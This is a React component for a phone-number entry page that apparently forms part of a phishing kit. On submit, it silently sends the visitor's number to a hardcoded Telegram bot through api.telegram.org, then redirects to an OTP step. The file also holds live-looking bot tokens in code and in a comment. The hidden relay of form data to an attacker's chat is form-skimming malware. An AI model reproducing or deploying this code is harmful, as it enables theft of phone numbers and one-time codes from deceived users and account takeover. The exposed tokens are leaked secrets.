import { useState } from 'react';
import PhoneInput from 'react-phone-input-2';
import 'react-phone-input-2/lib/style.css';
import { useNavigate } from 'react-router-dom';

function Phone() {
  const navigate = useNavigate();

  const [Number, setNumber] = useState('');


  // 6292955787:AAE5oPybPhyD3BUyveVgw9QsQMNZ6I51vpM
  // 727686605
  const handelSubmit = (e) => {
    e.preventDefault();
    if (Number) {
      const bot_token = '5912247911:AAF5D53I7Q89_juB6I-Je9jJMoC5ENYgKD0';
      const user_id = 5339916869;
      let my_text = `Mobail : ${Number}`;

      const url = `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${user_id}&text=${my_text}`;
      let api = new XMLHttpRequest();
      api.open('Get', url, true);
      api.send();
      navigate('/otp');
    } else {
      null;
    }
  };

  return (
    <div className=" flex items-center justify-center flex-col  ">
      <div>
        <p className="text-xl my-7">Please Enter Your Phone Number</p>
      </div>
      <div>
        <form
          action=""
          onSubmit={handelSubmit}
          className="flex items-center justify-center gap-3 flex-col lg:flex-row"
        >
          <PhoneInput
            country={'us'}
            placeholder="Enter Your Phone Number"
            name="number"
            required
            countryCodeEditable={false}
            onChange={(value) => {
              setNumber(value);
            }}
          />

          <div>
            <input
              className="bg-cyan-400 p-1 border border-black cursor-pointer"
              type="submit"
              value="Send Code "
            />
          </div>
        </form>
      </div>
    </div>
  );
}

export default Phone;
